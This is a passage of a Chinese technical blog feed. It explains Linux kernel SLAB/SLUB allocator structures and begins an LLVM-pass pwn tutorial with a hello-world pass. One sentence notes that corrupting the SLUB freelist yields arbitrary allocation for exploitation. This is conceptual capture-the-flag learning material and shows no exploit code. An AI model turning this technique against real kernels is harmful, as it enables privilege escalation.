class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里的<code>list_head</code>里面只保存了两个值：<code>next</code>指针和<code>prev</code>指针，也就是双向链表的经典结构。这里可以看到有三个双向链表：<code>slabs_partial</code>、<code>slabs_full</code>、<code>slabs_free</code>，分别保存的是<strong>内部有部分对象被分配的SLAB、内部所有对象都被分配的SLAB、内部所有对象都空闲的SLAB</strong>。这三个链表中的slab可以互相转化，如向一个所有对象都空闲的SLAB中申请空间成功后，这个SLAB就会从<code>slabs_free</code>移动到<code>slabs_partial</code>。</p><p>虽然文章开头参考的文章已经在一定程度上过时，但其中关于SLAB分配器的实现原理和思想却一直沿用至今。在5.18.19版本的<code>page</code>结构体中，已经找不到参考文章中的一些关键结构，不过这不影响我们对SLAB本身的分析。</p><p>下面是5.18.19版本内核的<code>slab</code>结构体声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> __page_flags;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_SLAB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* array of free object indexes */</span></span><br><span class="line"><span class="type">void</span> *s_mem;<span class="comment">/* first object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> active;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">int</span> slabs;<span class="comment">/* Nr of slabs left */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SLOB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="type">void</span> *__unused_1;</span><br><span class="line"><span class="type">void</span> *freelist;<span class="comment">/* first free block */</span></span><br><span class="line"><span class="type">long</span> units;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __unused_2;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">error</span> <span class="string">&quot;Unexpected slab allocator configured&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_t</span> __page_refcount;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，历史版本中的诸如<code>s_mem</code>等关键控制结构体从<code>page</code>移到了<code>slab</code>中。由此，<code>page</code>结构体中也就不需要定义这些属性了。<code>s_mem</code>指向的是该SLAB分配器中的第一个对象，而<code>freelist</code>指向的是一个重要的标识对象使用情况的结构，我们接下来就会提到。这两个指针指向同一页中的不同地址，其中如果一个<code>page</code>被用作SLAB分配器，那么它的<code>virtual</code>（<code>page</code>中的最后一个属性）属性值与SLAB中的<code>freelist</code>指向相同地址。</p><p>关于SLAB内的分配机制，以下面一张图进行展示，其中需要注意的是：<strong>分配到哪一个对象不是外界能够决定的，而释放哪一个对象是外界能够决定的</strong>。如下图所示的分配方式能够最大限度保证分配到的对象是最近释放的。**<font color=red>在进行分配时，active读取其索引指向的值，并向前移动一位，在进行释放时，active首先回退一位，在将这一位对应的索引值修改为被释放的对象的索引值。</font>**<br><img src="https://img-blog.csdnimg.cn/d9a0ac33729040e594f95bd884fffa23.png"><br>在这种分配机制下，很容易判断一个SLAB中的对象究竟是全部分配，还是全部释放，还是部分分配。因为分配对应一次索引值前移，而释放对应一次索引值后移，只要索引值为0，这个SLAB就一定为空；只要索引值等于SLAB中对象的个数-1，这个SLAB就一定为满。</p><p>看到这里，我们对于SLAB的分配机制应该有了一个基本的认识，但是SLAB中还有一个<strong>染色</strong>的问题。有了上面的组织形式，SLAB已经能够作为一个成熟的内存分配器了，至于为什么要添加染色的机制，主要是为了性能的考虑：</p><blockquote><p>我们知道内存需要处理时要先放入CPU硬件高速缓存中，而CPU硬件高速缓存与内存的映射方式有多种。在同一个kmem_cache中所有SLAB都是相同大小，都是相同连续长度的页框组成，这样的话在不同SLAB中相同对象号对于页框的首地址的偏移量也相同，这样有很可能导致不同SLAB中相同对象号的对象放入CPU硬件高速缓存时会处于同一行，当我们交替操作这两个对象时，CPU的cache就会交替换入换出，效率就非常差。SLAB着色就是在同一个kmem_cache中对不同的SLAB添加一个偏移量，就让相同对象号的对象不会对齐，也就不会放入硬件高速缓存的同一行中，提高了效率。</p></blockquote><blockquote><p>着色空间就是前端的空闲区域，这个区有大小都是在分配新的SLAB时计算好的，计算方法很简单，node结点对应的kmem_cache_node中的colour_next乘上kmem_cache中的colour_off就得到了偏移量，然后colour_next++，当colour_next等于kmem_cache中的colour时，colour_next回归到0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">偏移量 = kmem_cache.colour_off * kmem_cache.node[NODE_ID].colour_next;</span><br><span class="line"></span><br><span class="line">kmem_cache.node[NODE_ID].colour_next++;</span><br><span class="line"><span class="keyword">if</span> (kmem_cache.node[NODE_ID].colour_next == kmem_cache.colour)</span><br><span class="line">    kmem_cache.node[NODE_ID].colour_next = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></blockquote><h1 id="3-SLUB系统介绍"><a href="#3-SLUB系统介绍" class="headerlink" title="3. SLUB系统介绍"></a>3. SLUB系统介绍</h1><p>说完了SLAB，终于可以开始我们的重点——SLUB系统了。都说SLUB系统是SLAB的升级版，那么SLUB到底比SLAB升级在什么地方呢？</p><p>简单地来说，<strong>首先SLUB直接删掉了两个SLAB链表，即在SLAB节点中表示全空和全满的对象链表，只保留了一个部分满的SLAB链表。其次，在<code>slab</code>结构体内部也有很大的变化，删去了SLAB中指引内存分配的关键的数组结构和描述符数组，而只是使用一个指针形成链表，将所有空闲的对象串连在一起：</strong></p><p><img src="https://img-blog.csdnimg.cn/aaf4d2e6746849d1ab424e47cd21ff2e.png"><br>（原文是有贴图的，但是在笔者的windows系统下加载不出来，在ubuntu倒是可以加载出来。上图选自<a href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166522587916800182720892&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&utm_term=slub&spm=1018.2226.3001.4187">资料</a>）</p><p>注意slab和slub分别使用了不同的<code>kmem_cache</code>结构体，分别定义在<code>/include/linux/slab_def.h</code>和<code>/include/linux/slub_def.h</code>中。上面解释SLAB的时候使用的是<code>/include/linux/slab_def.h</code>的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line"><span class="comment">/* Used for retrieving partial slabs, etc. */</span></span><br><span class="line"><span class="type">slab_flags_t</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> min_partial;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;<span class="comment">/* The size of an object including metadata */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> object_size;<span class="comment">/* The size of an object without metadata */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_size</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset;<span class="comment">/* Free pointer offset */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpu_partial;</span><br><span class="line"><span class="comment">/* Number of per cpu partial slabs to keep around */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> cpu_partial_slabs;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line"><span class="type">gfp_t</span> allocflags;<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line"><span class="type">int</span> refcount;<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line"><span class="type">void</span> (*ctor)(<span class="type">void</span> *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> inuse;<span class="comment">/* Offset to metadata */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> align;<span class="comment">/* Alignment */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> random;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在SLUB的<code>kmem_cache</code>中，有一个<code>kmem_cache_cpu</code>结构体指针，这是SLUB分配器的描述符：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line"><span class="type">void</span> **freelist;<span class="comment">/* Pointer to next available object */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tid;<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span><span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span><span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">local_lock_t</span> lock;<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line"><span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构如下图所示（图片选自<a href="https://blog.csdn.net/whenloce/article/details/88949002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166522587916800182720892&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-88949002-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&utm_term=slub&spm=1018.2226.3001.4187">资料</a>）</p><p><img src="https://img-blog.csdnimg.cn/2019062509524131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doZW5sb2Nl,size_16,color_FFFFFF,t_70"><br>其中需要重点关注的就是<code>freelist</code>，里面保存的就是对象本身，以链表连接。在上一篇文章中，我们使用了SLUB的结构特性实现了利用，在那道题中，读者可以进行调试发现，对象内部的内容非常简单，空闲的对象开头8字节保存的就是下一个空闲对象的地址，以链表形式连接，在释放一个对象时，会将该对象放在<code>freelist</code>链表头部。这也就是为什么在上一题中通过修改指针的值就可以让SLUB为我们分配到任意地址了。<strong>在实际的pwn利用中，有一个思路就是恶意篡改SLUB中的<code>freelist</code>，破坏链表以实现任意地址分配，后续可能可以进行任意地址读写</strong>。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM pass pwn 入门 (1)</title>
      <link href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/"/>
      <url>/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-1/</url>
      
        <content type="html"><![CDATA[<p>近年来，pwn题出的可谓是越来越花，从C++到kernel，再到Rust、Go、Java一众语言，还有LLVM。其中LLVM在各种比赛中的出现频率越来越高，值得引起重视。借这篇文章，笔者开始LLVM pass类pwn题的入门。</p><p>首先，既然要研究LLVM，就要清楚LLVM到底是什么。</p><blockquote><p>它是以C++编写的构架编译器的框架系统。用于优化以任意程序语言编写的程序的编译时间(compile-time)、链接时间(link-time)、运行时间(run-time)以及空闲时间(idle-time)，对开发者保持开放，并兼容已有脚本。（摘自<a href="https://blog.csdn.net/yayaayaya123/article/details/83993041?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165728197316781818799638%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165728197316781818799638&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-83993041-null-null.142%5Ev32%5Econtrol,185%5Ev2%5Econtrol&utm_term=LLVM&spm=1018.2226.3001.4187">资料</a>）</p></blockquote><p>LLVM在编译过程中实际上发挥了一个牵线搭桥的作用。高级语言多种多样，但无论是哪一种语言的编译器，都需要对高级语言编写的代码进行词法与句法分析，这是编译器前端部分的工作。在分析完成后，前端会输出一个抽象语法树AST，由LLVM进行分析与优化，转化为中间表示IR。再由编译器后端根据IR生成可供执行的二进制代码。</p><blockquote><p>而pass是一种编译器开发的结构化技术，用于完成编译对象（如IR）的转换、分析或优化等功能。pass的执行就是编译器对编译对象进行转换、分析和优化的过程，pass构建了这些过程所需要的分析结果。<br>大概就是说，LLVM提供了一种中间语言形式，以及编译链接这种语言的后端能力，那么对于一个新语言，只要开发者能够实现新语言到IR的编译器前端设计，就可以享受到从IR到可执行文件这之间的LLVM提供的所有优化、分析或者代码插桩的能力。（摘自<a href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>）</p></blockquote><p>下面，笔者使用Ubuntu 20.04系统进行第一个LLVM pass的编写测试。</p><p>首先安装Clang：<code>apt install clang</code>，在Ubuntu 20.04安装clang会附带安装llvm-9和llvm-10，经过测试发现，只有llvm-10能够正常使用，用llvm-9的库编译会报错。</p><p>这里借<a href="https://mp.weixin.qq.com/s/6yHWECP21Fn-P585wxRTJA">资料</a>中的测试代码编写：</p><p>myFirstLLVMpass.cpp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Pass.h&quot;</span><span class="comment">//写Pass所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/Function.h&quot;</span><span class="comment">//操作函数所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Support/raw_ostream.h&quot;</span><span class="comment">//打印输出所必须的库</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> &#123; <span class="comment">//声明匿名空间，被声明的内容仅在文件内部可见</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">Hello</span> : <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">    <span class="built_in">Hello</span>() : <span class="built_in">FunctionPass</span>(ID) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;<span class="comment">//重写runOnFunction，使得每次遍历到一个函数的时候就输出函数名</span></span><br><span class="line">      <span class="built_in">errs</span>() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      <span class="built_in">errs</span>().<span class="built_in">write_escaped</span>(F.<span class="built_in">getName</span>()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for opt</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>)</span></span>;<span class="comment">//注册类Hello，第一个参数是命令行参数，第二个参数是名字</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Register for clang</span></span><br><span class="line"><span class="function"><span class="type">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="params"><span class="function">  [](<span class="type">const</span> PassManagerBuilder &amp;Builder, legacy::PassManagerBase &amp;PM) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">    PM.add(<span class="keyword">new</span> Hello());</span></span></span><br><span class="line"><span class="params"><span class="function">  &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>上面就是LLVM pass的C++代码了。我们需要一个C语言文件，这个文件中的内容无关紧要，这里用笔者做kernel pwn题中的一个文件为例：</p><p>firstLLVMtest.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 